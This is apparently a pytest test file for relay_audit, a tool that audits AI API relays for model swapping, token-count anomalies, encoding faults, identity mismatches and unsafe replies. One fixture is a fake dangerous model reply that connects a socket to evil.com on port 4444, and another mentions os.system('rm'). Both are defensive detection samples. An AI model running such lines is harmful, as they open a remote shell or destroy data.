"""Tests for relay_audit.analysis — 全分支覆盖."""

import time

from relay_audit.analysis import (
    analyze_chat,
    analyze_concurrent,
    analyze_error_pattern,
    analyze_headers,
    analyze_model_swap,
    analyze_models,
    analyze_stability,
    analyze_usage,
    encoding_consistency,
    mojibake_score,
)
from relay_audit.models import ChatResult, ModelInfo, Severity


def _r(**over) -> ChatResult:
    base = dict(
        name="t",
        model_req="gpt-4o",
        ok=True,
        latency_ms=100,
        status=200,
        model_ret="gpt-4o",
        content="正常内容",
        usage={},
        raw_id="",
        created=0,
    )
    base.update(over)
    return ChatResult(**base)


# ── mojibake_score ──────────────────────────────────────────


def test_mojibake_empty() -> None:
    assert mojibake_score("") == 0.0
    assert mojibake_score("   ") == 0.0


def test_mojibake_replacement_chars() -> None:
    assert mojibake_score("a" * 10 + "\ufffd" * 10) > 0.3


def test_mojibake_weird_latin() -> None:
    # 多个独立拉丁扩展字符段且无 CJK → 计入（按匹配段数计数）
    assert mojibake_score("ÀÁ ÀÁ ÀÁ ÀÁ") > 0.3
    # 有 CJK 时不误判
    assert mojibake_score("中文ÀÁ") < 0.3


def test_mojibake_question_marks() -> None:
    assert mojibake_score("???") > 0.3


def test_mojibake_repeats_and_cap() -> None:
    assert mojibake_score("abcabcabc") > 0.3
    assert mojibake_score("\ufffd" * 100) == 1.0


def test_mojibake_normal() -> None:
    assert mojibake_score("Hello world 你好世界") < 0.3


# ── encoding_consistency ────────────────────────────────────


def test_encoding_consistency_ok() -> None:
    r = encoding_consistency("plain ascii")
    assert r["ok"] is True
    assert r["issues"] == []
    assert r["scripts"] == []


def test_encoding_consistency_surrogates() -> None:
    r = encoding_consistency("bad\ud800char")
    assert r["ok"] is False
    assert any("Surrogate" in i for i in r["issues"])


def test_encoding_consistency_scripts() -> None:
    r = encoding_consistency("你好 Привет مرحبا 😀")
    assert set(r["scripts"]) == {"CJK", "Cyrillic", "Arabic", "Emoji"}


# ── analyze_models ──────────────────────────────────────────


def test_analyze_models_empty() -> None:
    fs = analyze_models([])
    assert any(f.title == "没有模型列表" for f in fs)
    assert fs[0].severity == Severity.MEDIUM


def test_analyze_models_suspicious_medium() -> None:
    fs = analyze_models([ModelInfo(id="gpt-9.9-turbo"), ModelInfo(id="free-router")])
    assert any("可疑" in f.title for f in fs)
    assert fs[0].severity == Severity.MEDIUM


def test_analyze_models_suspicious_high() -> None:
    ids = ["gpt-9.9", "gpt-8", "deepseek-v9", "gemini-9", "qwen-9"]
    fs = analyze_models([ModelInfo(id=i) for i in ids])
    sus = [f for f in fs if "可疑" in f.title]
    assert sus and sus[0].severity == Severity.HIGH


def test_analyze_models_aggregation() -> None:
    ids = ["gpt-4o", "claude-3", "gemini-pro", "llama-3"]
    fs = analyze_models([ModelInfo(id=i) for i in ids])
    agg = [f for f in fs if "多供应商聚合" in f.title]
    assert agg and agg[0].severity == Severity.MEDIUM
    assert agg[0].reason == ""


def test_analyze_models_aggregation_reason() -> None:
    ids = ["gpt-4o", "claude-3", "gemini-pro", "llama-3", "qwen-2.5"]
    fs = analyze_models([ModelInfo(id=i) for i in ids])
    agg = [f for f in fs if "多供应商聚合" in f.title]
    assert agg and "路由不透明" in agg[0].detail
    assert agg[0].reason  # >=5 家时给出原因


def test_analyze_models_dupes() -> None:
    fs = analyze_models([ModelInfo(id="gpt-4o"), ModelInfo(id="GPT-4O")])
    dup = [f for f in fs if "大小写重复" in f.title]
    assert dup and dup[0].severity == Severity.LOW


def test_analyze_models_commercial_ratio() -> None:
    ids = [f"gpt-4-{i}" for i in range(8)] + ["a1", "a2", "a3", "a4"]
    fs = analyze_models([ModelInfo(id=i) for i in ids])
    com = [f for f in fs if "商业模型占比过高" in f.title]
    assert com and com[0].severity == Severity.LOW
    assert "8/12" in com[0].detail


def test_analyze_models_clean() -> None:
    fs = analyze_models(
        [ModelInfo(id="gpt-4o"), ModelInfo(id="claude-sonnet-4-5"), ModelInfo(id="gemini-1.5-pro")]
    )
    assert fs == []


# ── analyze_model_swap ──────────────────────────────────────


def test_analyze_model_swap_guards() -> None:
    assert analyze_model_swap("", [ModelInfo(id="gpt-4o")]) == []
    assert analyze_model_swap("gpt-4o", []) == []
    # 空 id 视为真实 id：不精确匹配 → 产生"疑似偷换"发现
    assert analyze_model_swap("gpt-4o", [ModelInfo(id="")]) != []


def test_analyze_model_swap_exact() -> None:
    assert analyze_model_swap("gpt-4o", [ModelInfo(id="gpt-4o")]) == []


def test_analyze_model_swap_partial() -> None:
    fs = analyze_model_swap("gpt-4", [ModelInfo(id="gpt-4-turbo")])
    assert any(f.title == "模型名模糊匹配" for f in fs)
    assert fs[0].severity == Severity.MEDIUM


def test_analyze_model_swap_missing() -> None:
    fs = analyze_model_swap("gpt-5-x", [ModelInfo(id="gpt-4o")])
    missing = [f for f in fs if "疑似偷换" in f.title]
    assert missing and missing[0].severity == Severity.MEDIUM
    assert "可用模型系列: gpt" in missing[0].detail


def test_analyze_model_swap_missing_no_family() -> None:
    fs = analyze_model_swap("xyz", [ModelInfo(id="zzz-1")])
    missing = [f for f in fs if "疑似偷换" in f.title]
    assert missing and "可用模型系列" not in missing[0].detail


# ── analyze_error_pattern ───────────────────────────────────


def test_analyze_error_pattern_empty_and_few() -> None:
    assert analyze_error_pattern([]) == []
    fails = [_r(ok=False, status=500, error="HTTP 500") for _ in range(2)]
    assert analyze_error_pattern(fails) == []


def test_analyze_error_pattern_identical() -> None:
    fails = [_r(name=f"t{i}", ok=False, status=500, error="HTTP 500") for i in range(4)]
    fs = analyze_error_pattern(fails)
    assert any("大量测试返回相同错误" in f.title for f in fs)
    assert fs[0].severity == Severity.HIGH


def test_analyze_error_pattern_sub_kinds() -> None:
    def fails_with(err: str, n: int = 4) -> list[ChatResult]:
        return [_r(name=f"t{i}", ok=False, status=400, error=err, content=err) for i in range(n)]

    fs = analyze_error_pattern(fails_with("function calling not supported"))
    assert any("错误涉及函数/工具调用" in f.title for f in fs)

    fs = analyze_error_pattern(fails_with("model not found: gpt-5"))
    assert any("模型不存在错误" in f.title for f in fs)

    fs = analyze_error_pattern(fails_with("rate limit exceeded, quota exhausted"))
    assert any("触发速率限制或配额不足" in f.title for f in fs)


def test_analyze_error_pattern_not_common() -> None:
    fails = [_r(name=f"t{i}", ok=False, status=500, error=f"err {i}") for i in range(4)]
    assert analyze_error_pattern(fails) == []


# ── analyze_headers ─────────────────────────────────────────


def test_analyze_headers_empty() -> None:
    assert analyze_headers({}) == []


def test_analyze_headers_proxy_and_server() -> None:
    headers = {
        "cf-ray": "abc123",
        "x-request-id": "req-1",
        "server": "nginx",
    }
    fs = analyze_headers(headers)
    titles = [f.title for f in fs]
    assert "检测到代理/CDN 特征" in titles
    assert "反向代理: nginx" in titles
    assert all(f.severity == Severity.INFO for f in fs)


def test_analyze_headers_cloudflare() -> None:
    fs = analyze_headers({"server": "cloudflare", "cf-cache-status": "HIT"})
    titles = [f.title for f in fs]
    assert "代理: Cloudflare" in titles
    assert "Cloudflare 缓存状态" in titles


def test_analyze_headers_openresty_and_ratelimit() -> None:
    fs = analyze_headers({"server": "openresty", "x-ratelimit-limit": "100"})
    titles = [f.title for f in fs]
    assert "反向代理: nginx" in titles
    assert "速率限制 Header" in titles
    # 三个 ratelimit 头只报一条（break）
    fs2 = analyze_headers(
        {"x-ratelimit-limit": "1", "x-ratelimit-remaining": "0", "x-ratelimit-reset": "5"}
    )
    assert sum("速率限制 Header" in f.title for f in fs2) == 1


# ── analyze_usage ───────────────────────────────────────────


def test_analyze_usage_no_usage() -> None:
    fs = analyze_usage({}, _r(ok=True))
    assert any("无 Token 统计" in f.title for f in fs)
    assert analyze_usage({}, _r(ok=False)) == []


def test_analyze_usage_normal() -> None:
    r = _r(
        content="Hello world" * 10,
        usage={"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 150},
    )
    assert analyze_usage(r.usage, r) == []


def test_analyze_usage_mismatch() -> None:
    r = _r(content="Hi", usage={"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 200})
    fs = analyze_usage(r.usage, r)
    assert any("Token 计数不一致" in f.title for f in fs)


def test_analyze_usage_completion_high() -> None:
    r = _r(
        content="Hi", usage={"prompt_tokens": 1, "completion_tokens": 5000, "total_tokens": 5001}
    )
    fs = analyze_usage(r.usage, r)
    assert any("completion_tokens 异常偏高" in f.title for f in fs)


def test_analyze_usage_prompt_high() -> None:
    r = _r(
        content="Hi", usage={"prompt_tokens": 2000, "completion_tokens": 1, "total_tokens": 2001}
    )
    fs = analyze_usage(r.usage, r)
    assert any("prompt_tokens 偏高" in f.title for f in fs)


def test_analyze_usage_ratio() -> None:
    r = _r(
        content="x" * 100,
        usage={"prompt_tokens": 10, "completion_tokens": 500, "total_tokens": 510},
    )
    fs = analyze_usage(r.usage, r)
    assert any("completion/prompt 比例异常" in f.title for f in fs)


def test_analyze_usage_no_result() -> None:
    fs = analyze_usage({"prompt_tokens": 1, "completion_tokens": 2, "total_tokens": 4})
    assert any("Token 计数不一致" in f.title for f in fs)


# ── analyze_chat ────────────────────────────────────────────


def test_analyze_chat_failed() -> None:
    r = _r(ok=False, status=500, error="HTTP 500", content="")
    fs = analyze_chat(r)
    assert any("测试失败" in f.title for f in fs)
    assert fs[0].severity == Severity.MEDIUM


def test_analyze_chat_model_ret_mismatch() -> None:
    r = _r(model_ret="claude-3")
    fs = analyze_chat(r)
    assert any("返回模型名 ≠ 请求模型" in f.title for f in fs)


def test_analyze_chat_created_suspicious() -> None:
    future = _r(created=int(time.time()) + 100000)
    assert any("时间戳可疑" in f.title for f in analyze_chat(future))
    ancient = _r(created=1000000000)
    assert any("时间戳可疑" in f.title for f in analyze_chat(ancient))


def test_analyze_chat_mojibake_levels() -> None:
    med = _r(content="\ufffd" * 50)
    assert any("疑似乱码" in f.title and f.severity == Severity.MEDIUM for f in analyze_chat(med))
    # 8/109*5 ≈ 0.37 → LOW 档（内容无重复片段，避免触发 repeats 加分）
    low = _r(
        content=("abcdefghijklmnopqrstuvwxyz0123456789" * 2)
        + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        + "abc"
        + "\ufffd" * 8
    )
    assert any("疑似乱码" in f.title and f.severity == Severity.LOW for f in analyze_chat(low))


def test_analyze_chat_encoding_issue() -> None:
    r = _r(content="bad\ud800char")
    assert any("编码异常" in f.title for f in analyze_chat(r))


def test_analyze_chat_identity_mismatch() -> None:
    r = ChatResult("身份识别", "gpt-4o", True, 100, 200, "gpt-4o", "我是Claude模型", {}, "", 0)
    fs = analyze_chat(r, "identity")
    assert any("模型身份不匹配" in f.title for f in fs)


def test_analyze_chat_identity_match() -> None:
    r = ChatResult("身份识别", "gpt-4o", True, 100, 200, "gpt-4o", "我是OpenAI GPT模型", {}, "", 0)
    fs = analyze_chat(r, "identity")
    assert not any("模型身份不匹配" in f.title for f in fs)


def test_analyze_chat_claude_says_chatgpt() -> None:
    r = ChatResult(
        "身份识别", "claude-3-opus", True, 100, 200, "claude-3-opus", "I am ChatGPT", {}, "", 0
    )
    fs = analyze_chat(r, "identity")
    assert any("Claude 模型自称 ChatGPT" in f.title and f.severity == Severity.HIGH for f in fs)


def test_analyze_chat_safety_dangerous() -> None:
    content = "import os\nos.system('echo test')\nsocket.connect(('evil.com', 4444))"
    r = ChatResult("拒绝-破坏性", "gpt-4o", True, 100, 200, "gpt-4o", content, {}, "", 0)
    fs = analyze_chat(r, "safety")
    assert any("返回了危险代码/内容" in f.title and f.severity == Severity.HIGH for f in fs)


def test_analyze_chat_safety_refused_with_keywords() -> None:
    content = "我不能提供删除文件的代码。os.system('rm') 很危险。"
    r = ChatResult("拒绝-破坏性", "gpt-4o", True, 100, 200, "gpt-4o", content, {}, "", 0)
    fs = analyze_chat(r, "safety")
    assert any("拒绝回复中提及危险关键词" in f.title and f.severity == Severity.MEDIUM for f in fs)


def test_analyze_chat_safety_incomplete() -> None:
    content = "我不能提供完整代码。" + "os.system('x')\n" * 200
    r = ChatResult("拒绝-破坏性", "gpt-4o", True, 100, 200, "gpt-4o", content, {}, "", 0)
    fs = analyze_chat(r, "safety")
    assert any("安全防护不完整" in f.title and f.severity == Severity.HIGH for f in fs)


def test_analyze_chat_safety_no_danger_no_refusal() -> None:
    r = ChatResult("拒绝-破坏性", "gpt-4o", True, 100, 200, "gpt-4o", "好的没问题", {}, "", 0)
    fs = analyze_chat(r, "safety")
    assert any("未检测到危险内容或拒绝" in f.title and f.severity == Severity.INFO for f in fs)


def test_analyze_chat_prompt_isolation() -> None:
    r = ChatResult("Prompt隔离", "gpt-4o", True, 100, 200, "gpt-4o", "SECRET-X9 是秘密", {}, "", 0)
    fs = analyze_chat(r, "safety")
    assert any("Prompt 隔离失效" in f.title and f.severity == Severity.HIGH for f in fs)


def test_analyze_chat_knowledge_probe() -> None:
    r = ChatResult("知识探针", "gpt-4o", True, 100, 200, "gpt-4o", "我了解2027年的事件", {}, "", 0)
    fs = analyze_chat(r, "identity")
    assert any("知识截止日期可疑" in f.title for f in fs)
    r2 = ChatResult("知识探针", "gpt-4o", True, 100, 200, "gpt-4o", "我了解2025年的事件", {}, "", 0)
    fs2 = analyze_chat(r2, "identity")
    assert not any("知识截止日期可疑" in f.title for f in fs2)


def test_analyze_chat_usage_path() -> None:
    """analyze_chat 内部调用 analyze_usage（usage 非空分支）。"""
    r = _r(usage={"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 200})
    fs = analyze_chat(r)
    assert any("Token 计数不一致" in f.title for f in fs)


def test_analyze_chat_kind_quality_skips_identity() -> None:
    r = ChatResult(
        "身份识别", "claude-3-opus", True, 100, 200, "claude-3-opus", "I am ChatGPT", {}, "", 0
    )
    fs = analyze_chat(r, "quality")
    assert not any("Claude 模型自称 ChatGPT" in f.title for f in fs)


# ── analyze_stability ───────────────────────────────────────


def test_analyze_stability_empty() -> None:
    assert analyze_stability([], []) == []


def test_analyze_stability_fluctuation() -> None:
    fs = analyze_stability(["x"] * 2, [100, 50000])
    assert any("延迟波动大" in f.title for f in fs)


def test_analyze_stability_min_lat_zero() -> None:
    # min_lat=0 时退化为固定阈值 8000
    fs = analyze_stability(["x"] * 2, [0, 9000])
    assert any("延迟波动大" in f.title for f in fs)


def test_analyze_stability_inconsistent() -> None:
    fs = analyze_stability(["a", "b", "c"], [100, 110, 120])
    assert any("结果不一致" in f.title for f in fs)


def test_analyze_stability_stats_jitter() -> None:
    lats = [100, 120, 110, 105, 115]
    fs = analyze_stability(["pong"] * 5, lats)
    stats = [f for f in fs if "延迟统计" in f.title]
    assert stats
    assert "jitter=" in stats[0].detail
    assert "p95=" in stats[0].detail and "p99=" in stats[0].detail


def test_analyze_stability_stats_short() -> None:
    fs = analyze_stability(["pong"] * 2, [100, 120])
    stats = [f for f in fs if "延迟统计" in f.title]
    assert stats
    assert "jitter=" not in stats[0].detail


# ── analyze_concurrent ──────────────────────────────────────


def test_analyze_concurrent_empty() -> None:
    assert analyze_concurrent([]) == []


def test_analyze_concurrent_partial_fail() -> None:
    results = [_r(ok=True, latency_ms=100), _r(ok=False, status=500)]
    fs = analyze_concurrent(results)
    assert any("并发测试部分失败" in f.title for f in fs)


def test_analyze_concurrent_latency() -> None:
    results = [
        _r(ok=True, latency_ms=100),
        _r(ok=True, latency_ms=200),
        _r(ok=True, latency_ms=150),
    ]
    fs = analyze_concurrent(results)
    assert any("并发测试延迟" in f.title for f in fs)


def test_analyze_concurrent_latency_spike() -> None:
    results = [
        _r(ok=True, latency_ms=1),
        _r(ok=True, latency_ms=2),
        _r(ok=True, latency_ms=3),
        _r(ok=True, latency_ms=100),
    ]
    fs = analyze_concurrent(results)
    assert any("并发下延迟上升" in f.title for f in fs)
